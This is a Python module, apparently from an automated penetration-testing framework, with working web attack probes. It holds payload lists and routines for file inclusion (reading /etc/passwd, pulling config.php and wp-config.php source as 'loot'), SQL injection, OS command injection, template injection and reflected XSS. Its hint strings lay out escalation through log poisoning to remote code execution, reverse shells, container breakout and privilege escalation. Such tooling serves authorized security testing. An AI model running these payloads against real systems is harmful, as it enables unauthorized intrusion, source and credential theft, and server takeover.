"""Web application attack probes — deterministic, not LLM-driven.

First capability: LFI/RFI hunting. Given a URL, discover parameters (from
links and forms on the page) plus a built-in list of classic parameter names,
then probe each with traversal payloads and the php://filter wrapper.

Detection is signature-based (`root:x:0:0:`, `[boot loader]`, decodable
base64 PHP source) — a hit is tool-proven ground truth, recorded as a
verified finding with the response as evidence, and any extracted source
code lands in loot. No LLM judgment involved.

Everything runs inside the engagement's own HTTP calls (requests), recorded
in the DB action log and audit chain like any other action.
"""

from __future__ import annotations

import base64
import re
import time
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import requests

from .db import EngagementDB
from .diag import get_logger

log = get_logger("webattack")

# signature → what it proves
DETECTORS = [
    (re.compile(r"root:.{0,40}:0:0:"), "Unix /etc/passwd content"),
    (re.compile(r"daemon:\S+?:/usr/sbin"), "Unix /etc/passwd content"),
    (re.compile(r"\[boot loader\]", re.I), "Windows win.ini content"),
]

COMMON_PARAMS = [
    "page", "file", "view", "cat", "dog", "id", "path", "include", "doc",
    "document", "root", "folder", "pg", "template", "content", "lang",
    "mod", "dir", "action", "load", "read", "site", "url", "filename",
    "name", "image", "img", "pic", "picture", "ext", "item", "show",
]

TRAVERSAL_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]

FILTER_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=index.php",
]

# app files worth pulling through a confirmed LFI (source → creds, logic flaws)
SOURCE_FILES = ["index.php", "config.php", "db.php", "database.php",
                "wp-config.php", "config.inc.php"]

# ---- SQLi --------------------------------------------------------------------
SQLI_ERROR_PAYLOADS = ["'", "\"", "' OR '1'='1", "1' AND 1=CONVERT(int,@@version)--"]
SQLI_ERROR_SIGS = [
    re.compile(r"SQL syntax.{0,60}MySQL|mysql_fetch|mysql_num_rows|"
               r"MySqlException|valid MySQL result", re.I),
    re.compile(r"pg_query\(\)|pg_exec\(\)|PostgreSQL.{0,40}ERROR|"
               r"unterminated quoted string", re.I),
    re.compile(r"SQLite3::|sqlite_fetch|SQLITE_ERROR", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"Microsoft OLE DB Provider for SQL|Unclosed quotation mark|"
               r"SqlException", re.I),
    re.compile(r"You have an error in your SQL syntax", re.I),
]
# (true_payload, false_payload) appended to a value: equal means injectable
SQLI_BOOLEAN_PAIRS = [("' AND '1'='1", "' AND '1'='2"),
                      ('" AND "1"="1', '" AND "1"="2'),
                      (" AND 1=1", " AND 1=2")]
SQLI_TIME_PAYLOADS = ["' OR SLEEP(3)-- ", "1; WAITFOR DELAY '0:0:3'--",
                      "' AND (SELECT 1 FROM (SELECT SLEEP(3))a)-- "]
SQLI_TIME_THRESHOLD = 2.8

# ---- command injection --------------------------------------------------------
CMDI_PAYLOADS = [";id", "| id", "`id`", "$(id)", "& id", "0;id"]
CMDI_SIG = re.compile(r"uid=\d+\([^\)]+\)\s+gid=\d+\(")
CMDI_WIN_SIG = re.compile(r"Volume Serial Number|Directory of [A-Z]:\\", re.I)
CMDI_WIN_PAYLOADS = ["& whoami", "| whoami", "; whoami"]
CMDI_WIN_RE = re.compile(r"\b(nt authority\\[\w .-]+|\w+\\\w+)\b")

# ---- SSTI ----------------------------------------------------------------------
# unique arithmetic so the rendered value cannot appear in the page by chance
SSTI_PROBES = [("{{7331*7}}", "51317"), ("${7331*7}", "51317"),
               ("<%= 7331*7 %>", "51317"), ("#{7331*7}", "51317"),
               ("{{7*'7'}}", "7777777")]

# ---- reflected XSS --------------------------------------------------------------
XSS_CANARY = 'aegis7x<svg/onload=alert(1)>"\''
XSS_SIG = re.compile(r"aegis7x<svg/onload=alert\(1\)>", re.I)

LINK_PARAM_RE = re.compile(r"[?&]([a-zA-Z_][\w-]{0,30})=")
FORM_INPUT_RE = re.compile(r"<input[^>]+name=[\"']([\w-]{1,30})[\"']", re.I)
HREF_RE = re.compile(r"href=[\"']([^\"']+\?[^\"']+)[\"']", re.I)


def _detection(body: str) -> str | None:
    for rx, label in DETECTORS:
        if rx.search(body):
            return label
    return None


class WebAttacker:
    def __init__(self, db: EngagementDB, audit=None, timeout: float = 8.0,
                 max_probes: int = 200):
        self.db = db
        self.audit = audit
        self.timeout = timeout
        self.max_probes = max_probes
        self._probes = 0

    # ---- discovery ---------------------------------------------------------
    def discover_params(self, url: str) -> list[tuple[str, str]]:
        """(page_url, param) candidates from the page itself + common names."""
        found: list[tuple[str, str]] = []
        try:
            r = requests.get(url, timeout=self.timeout, verify=False)
        except requests.RequestException as exc:
            log.warning("discover: %s unreachable: %s", url, exc)
            return found
        body = r.text
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        for href in HREF_RE.findall(body):
            full = href if href.startswith("http") else base + "/" + href.lstrip("/")
            parsed = urlparse(full)
            for param, _val in parse_qsl(parsed.query):
                page = urlunparse(parsed._replace(query=""))
                found.append((page, param))
        for param in FORM_INPUT_RE.findall(body):
            found.append((url, param))
        for param in COMMON_PARAMS:
            found.append((url, param))
        # dedupe
        seen, out = set(), []
        for pair in found:
            if pair not in seen:
                seen.add(pair)
                out.append(pair)
        return out

    # ---- probing -------------------------------------------------------------
    def _get_timed(self, url: str, param: str, payload: str,
                   timeout: float | None = None) -> tuple[str | None, float]:
        self._probes += 1
        t0 = time.time()
        try:
            parsed = urlparse(url)
            pairs = [(k, v) for k, v in parse_qsl(parsed.query) if k != param]
            base = urlunparse(parsed._replace(query=urlencode(pairs)))
            if "%2f" in payload.lower() or "%25" in payload.lower():
                # pre-encoded payloads: splice into the URL raw
                sep = "&" if pairs else "?"
                full = f"{base}{sep}{param}={payload}"
                r = requests.get(full, timeout=timeout or self.timeout,
                                 verify=False)
            else:
                r = requests.get(base, params={param: payload},
                                 timeout=timeout or self.timeout, verify=False)
            return r.text, time.time() - t0
        except requests.RequestException:
            return None, time.time() - t0

    def _get(self, url: str, param: str, payload: str) -> str | None:
        return self._get_timed(url, param, payload)[0]

    def probe_lfi(self, url: str, target_id: int,
                  host: str = "") -> dict:
        """Probe a URL for LFI. Records attempts/findings/loot; returns a
        summary dict: {vulnerable, param, payload, evidence}."""
        candidates = self.discover_params(url)
        if not candidates:
            return {"vulnerable": False, "error": "no parameters to test"}
        if self.audit:
            self.audit.log("operator", "webattack", "lfi_probe_start",
                           {"url": url, "candidates": len(candidates)})

        for page, param in candidates:
            if self._probes >= self.max_probes:
                break
            for payload in TRAVERSAL_PAYLOADS:
                body = self._get(page, param, payload)
                if body is None:
                    break  # page unreachable — move on
                hit = _detection(body)
                if hit:
                    return self._record_lfi(page, param, payload, hit,
                                            target_id, host)
            # wrapper check: does the param route through php's include?
            for payload in FILTER_PAYLOADS:
                body = self._get(page, param, payload)
                if not body:
                    break
                b64 = re.search(r"[A-Za-z0-9+/=]{200,}", body)
                if b64:
                    try:
                        decoded = base64.b64decode(b64.group(0)).decode(
                            "utf-8", "replace")
                    except (ValueError, UnicodeDecodeError):
                        continue
                    if "<?php" in decoded or "<html" in decoded.lower():
                        return self._record_lfi(
                            page, param, payload,
                            "php://filter source disclosure", target_id, host,
                            source_loot=decoded[:4000])
        if self.audit:
            self.audit.log("operator", "webattack", "lfi_probe_clean",
                           {"url": url, "probes": self._probes})
        return {"vulnerable": False, "probes": self._probes}

    # ---- post-exploitation: source disclosure through a confirmed LFI --------
    def read_sources(self, page: str, param: str, target_id: int) -> dict:
        """Pull application source files through a confirmed LFI via
        php://filter. Each decoded file lands in the loot vault."""
        files: list[str] = []
        for res in SOURCE_FILES:
            body = self._get(page, param,
                             f"php://filter/convert.base64-encode/resource={res}")
            if not body:
                continue
            blob = re.search(r"[A-Za-z0-9+/=]{40,}", body)
            if not blob:
                continue
            try:
                decoded = base64.b64decode(blob.group(0)).decode(
                    "utf-8", "replace")
            except (ValueError, UnicodeDecodeError):
                continue
            if not ("<?php" in decoded or "define(" in decoded
                    or "<html" in decoded.lower()):
                continue
            files.append(res)
            self.db.record_loot(target_id, "note",
                                f"source code: {res} (via {param})",
                                value=decoded[:4000],
                                source=f"{page}?{param}=php://filter…{res}")
            log.warning("source disclosure: %s via %s on %s", res, param, page)
        summary = (f"read {len(files)} source file(s): {', '.join(files)}"
                   if files else "no source files readable via php://filter")
        if self.audit:
            self.audit.log("operator", "webattack", "source_read",
                           {"page": page, "param": param, "files": files})
        return {"files": files, "summary": summary}

    # ---- recording -------------------------------------------------------------
    def _record_lfi(self, page, param, payload, evidence_label, target_id,
                    host, source_loot: str | None = None) -> dict:
        url_show = f"{page}?{param}={payload}"
        fid = self.db.record_finding(
            target_id,
            f"Local File Inclusion via '{param}' parameter",
            severity="high",
            description=(f"LFI confirmed on {page} — parameter '{param}' with "
                         f"payload '{payload}' returned {evidence_label}. "
                         "Read arbitrary server files; escalate via log "
                         "poisoning or php://filter source disclosure."),
            evidence=url_show,
            remediation=("Never pass user input into include/require. "
                         "Whitelist allowed pages; disable allow_url_include."),
            provenance="tool-proven", verified=1)
        self.db.record_attempt(target_id, "lfi", f"web param {param}",
                               url_show, f"CONFIRMED: {evidence_label}", True,
                               evidence=url_show)
        if source_loot:
            self.db.record_loot(target_id, "note",
                                f"source code via php://filter ({param})",
                                value=source_loot, source=url_show)
        if self.audit:
            self.audit.log("operator", "webattack", "lfi_found",
                           {"url": page, "param": param, "payload": payload,
                            "evidence": evidence_label})
        log.warning("LFI CONFIRMED: %s (%s)", url_show, evidence_label)
        return {"vulnerable": True, "param": param, "payload": payload,
                "evidence": evidence_label, "finding_id": fid,
                "probes": self._probes,
                "next_steps": DOCKER_HINT}

    # ---- generic injection recording ------------------------------------------
    def _record_hit(self, technique: str, title: str, severity: str,
                    description: str, remediation: str, page: str,
                    param: str, payload: str, evidence_label: str,
                    target_id: int, next_steps: str = "") -> dict:
        url_show = f"{page}?{param}={payload}"
        fid = self.db.record_finding(
            target_id, title, severity=severity, description=description,
            evidence=url_show, remediation=remediation,
            provenance="tool-proven", verified=1)
        self.db.record_attempt(target_id, technique, f"web param {param}",
                               url_show, f"CONFIRMED: {evidence_label}", True,
                               evidence=url_show)
        if self.audit:
            self.audit.log("operator", "webattack", f"{technique}_found",
                           {"url": page, "param": param, "payload": payload,
                            "evidence": evidence_label})
        log.warning("%s CONFIRMED: %s (%s)", technique.upper(), url_show,
                    evidence_label)
        return {"vulnerable": True, "param": param, "payload": payload,
                "evidence": evidence_label, "finding_id": fid,
                "probes": self._probes, "next_steps": next_steps}

    # ---- SQLi ------------------------------------------------------------------
    def probe_sqli(self, url: str, target_id: int, host: str = "") -> dict:
        """Error-based → boolean-based → time-based SQLi. Each confirmed by
        an independent signal (DB error text, true/false differential,
        injected sleep) — a hit is tool-proven."""
        candidates = self.discover_params(url)
        if not candidates:
            return {"vulnerable": False, "error": "no parameters to test"}
        if self.audit:
            self.audit.log("operator", "webattack", "sqli_probe_start",
                           {"url": url, "candidates": len(candidates)})

        for page, param in candidates:
            if self._probes >= self.max_probes:
                break
            # 1. error-based
            errored = False
            for payload in SQLI_ERROR_PAYLOADS:
                body = self._get(page, param, payload)
                if body is None:
                    errored = True  # unreachable — skip param entirely
                    break
                for sig in SQLI_ERROR_SIGS:
                    if sig.search(body):
                        return self._record_hit(
                            "sqli", f"SQL Injection (error-based) via "
                                    f"'{param}' parameter",
                            "high",
                            f"Error-based SQLi confirmed on {page} — "
                            f"parameter '{param}' with payload '{payload}' "
                            f"triggered a database error signature.",
                            "Use parameterized queries / prepared "
                            "statements; never concatenate user input into "
                            "SQL. Suppress DB errors in production.",
                            page, param, payload,
                            "database error signature in response",
                            target_id,
                            next_steps="SQLi confirmed. Enumerate with "
                                       "sqlmap: sqlmap -u '<url>' --dbs "
                                       "(in scope + allowlisted), or extract "
                                       "manually via UNION SELECT.")
            if errored:
                continue
            # 2. boolean-based: true response must equal baseline AND differ
            #    from the false response — three independent requests agree
            baseline = self._get(page, param, "1")
            if baseline is None:
                continue
            for true_p, false_p in SQLI_BOOLEAN_PAIRS:
                true_r = self._get(page, param, "1" + true_p)
                false_r = self._get(page, param, "1" + false_p)
                if true_r is None or false_r is None:
                    break
                if true_r == baseline and false_r != true_r:
                    return self._record_hit(
                        "sqli", f"SQL Injection (boolean-blind) via "
                                f"'{param}' parameter",
                        "high",
                        f"Boolean-blind SQLi confirmed on {page} — "
                        f"'{param}': TRUE condition matches baseline, FALSE "
                        f"condition changes the response.",
                        "Use parameterized queries; normalize error and "
                        "empty-result responses.",
                        page, param, f"1{true_p} / 1{false_p}",
                        "true/false response differential", target_id,
                        next_steps="Blind SQLi confirmed — extract data "
                                   "character-by-character (sqlmap --technique=B "
                                   "automates this).")
            # 3. time-based (last resort — costs seconds per probe)
            base_body, base_t = self._get_timed(page, param, "1")
            if base_body is None or base_t > 2.0:
                continue  # no reliable baseline latency
            for payload in SQLI_TIME_PAYLOADS:
                body, elapsed = self._get_timed(page, param, payload,
                                                timeout=self.timeout + 6)
                if body is None:
                    break
                if elapsed >= SQLI_TIME_THRESHOLD and \
                        elapsed - base_t >= SQLI_TIME_THRESHOLD:
                    return self._record_hit(
                        "sqli", f"SQL Injection (time-based blind) via "
                                f"'{param}' parameter",
                        "high",
                        f"Time-based blind SQLi confirmed on {page} — "
                        f"'{param}' with '{payload}' delayed the response "
                        f"{elapsed:.1f}s vs {base_t:.1f}s baseline.",
                        "Use parameterized queries; DB accounts should be "
                        "least-privilege.",
                        page, param, payload,
                        f"injected delay {elapsed:.1f}s vs {base_t:.1f}s",
                        target_id,
                        next_steps="Time-based SQLi confirmed — slow but "
                                   "fully exploitable (sqlmap --technique=T).")
        if self.audit:
            self.audit.log("operator", "webattack", "sqli_probe_clean",
                           {"url": url, "probes": self._probes})
        return {"vulnerable": False, "probes": self._probes}

    # ---- command injection ------------------------------------------------------
    def probe_cmdi(self, url: str, target_id: int, host: str = "") -> dict:
        """OS command injection: detect `id`/`whoami` output in the response."""
        candidates = self.discover_params(url)
        if not candidates:
            return {"vulnerable": False, "error": "no parameters to test"}
        for page, param in candidates:
            if self._probes >= self.max_probes:
                break
            for payload in CMDI_PAYLOADS:
                body = self._get(page, param, payload)
                if body is None:
                    break
                m = CMDI_SIG.search(body)
                if m:
                    return self._record_hit(
                        "cmdi", f"OS Command Injection via '{param}' parameter",
                        "critical",
                        f"Command injection confirmed on {page} — '{param}' "
                        f"with payload '{payload}' executed 'id': {m.group(0)}.",
                        "Never pass user input to system shells. Use "
                        "allowlisted arguments and exec without a shell.",
                        page, param, payload, f"command output: {m.group(0)}",
                        target_id,
                        next_steps="RCE achieved — establish a shell "
                                   "(/msf or manual reverse shell), then "
                                   "/privesc for escalation and check "
                                   "container breakout indicators.")
            for payload in CMDI_WIN_PAYLOADS:
                body = self._get(page, param, payload)
                if body is None:
                    break
                if CMDI_WIN_SIG.search(body):
                    return self._record_hit(
                        "cmdi", f"OS Command Injection (Windows) via "
                                f"'{param}' parameter",
                        "critical",
                        f"Command injection confirmed on {page} — '{param}' "
                        f"with payload '{payload}' produced Windows command "
                        "output.",
                        "Never pass user input to system shells.",
                        page, param, payload, "Windows command output",
                        target_id)
        if self.audit:
            self.audit.log("operator", "webattack", "cmdi_probe_clean",
                           {"url": url, "probes": self._probes})
        return {"vulnerable": False, "probes": self._probes}

    # ---- SSTI ---------------------------------------------------------------------
    def probe_ssti(self, url: str, target_id: int, host: str = "") -> dict:
        """Server-side template injection: unique arithmetic canaries that
        only render if the template engine evaluates them."""
        candidates = self.discover_params(url)
        if not candidates:
            return {"vulnerable": False, "error": "no parameters to test"}
        for page, param in candidates:
            if self._probes >= self.max_probes:
                break
            baseline = self._get(page, param, "aegis7x")
            if baseline is None:
                continue
            for payload, expect in SSTI_PROBES:
                if expect in baseline:
                    break  # canary value already in page — param unusable
                body = self._get(page, param, payload)
                if body is None:
                    break
                if expect in body and payload not in body:
                    return self._record_hit(
                        "ssti", f"Server-Side Template Injection via "
                                f"'{param}' parameter",
                        "high",
                        f"SSTI confirmed on {page} — '{param}' evaluated "
                        f"'{payload}' and rendered '{expect}'.",
                        "Never render user input inside templates. Use "
                        "logic-less templates or sandboxed rendering.",
                        page, param, payload,
                        f"template engine evaluated to {expect}", target_id,
                        next_steps="SSTI confirmed — escalate to RCE with "
                                   "engine-specific payloads (tplmap "
                                   "automates detection→shell).")
        if self.audit:
            self.audit.log("operator", "webattack", "ssti_probe_clean",
                           {"url": url, "probes": self._probes})
        return {"vulnerable": False, "probes": self._probes}

    # ---- reflected XSS -------------------------------------------------------------
    def probe_xss(self, url: str, target_id: int, host: str = "") -> dict:
        """Reflected XSS: canary with HTML metacharacters; vulnerable only
        when reflected UNESCAPED."""
        candidates = self.discover_params(url)
        if not candidates:
            return {"vulnerable": False, "error": "no parameters to test"}
        for page, param in candidates:
            if self._probes >= self.max_probes:
                break
            body = self._get(page, param, XSS_CANARY)
            if body is None:
                continue
            if XSS_SIG.search(body):
                return self._record_hit(
                    "xss", f"Reflected XSS via '{param}' parameter",
                    "medium",
                    f"Reflected XSS confirmed on {page} — '{param}' "
                    "reflects HTML metacharacters unescaped "
                    "(<svg/onload=alert(1)> rendered verbatim).",
                    "Context-encode all reflected user input; set a "
                    "Content-Security-Policy.",
                    page, param, XSS_CANARY,
                    "unescaped reflection of HTML canary", target_id)
        if self.audit:
            self.audit.log("operator", "webattack", "xss_probe_clean",
                           {"url": url, "probes": self._probes})
        return {"vulnerable": False, "probes": self._probes}


DOCKER_HINT = ("LFI confirmed. Escalation path: 1) read app source via "
               "php://filter/convert.base64-encode/resource=index.php for "
               "creds and logic flaws; 2) poison logs (User-Agent with PHP) "
               "then include /var/log/apache2/access.log or "
               "/var/log/nginx/access.log for RCE; 3) after a shell, check "
               "container breakout: ls /.dockerenv, cat /proc/1/cgroup, "
               "hostname (random hex = container), capsh --print for "
               "dangerous capabilities, mounted /var/run/docker.sock, "
               "writable host paths; 4) use /privesc <host> and /msf for "
               "weaponization.")
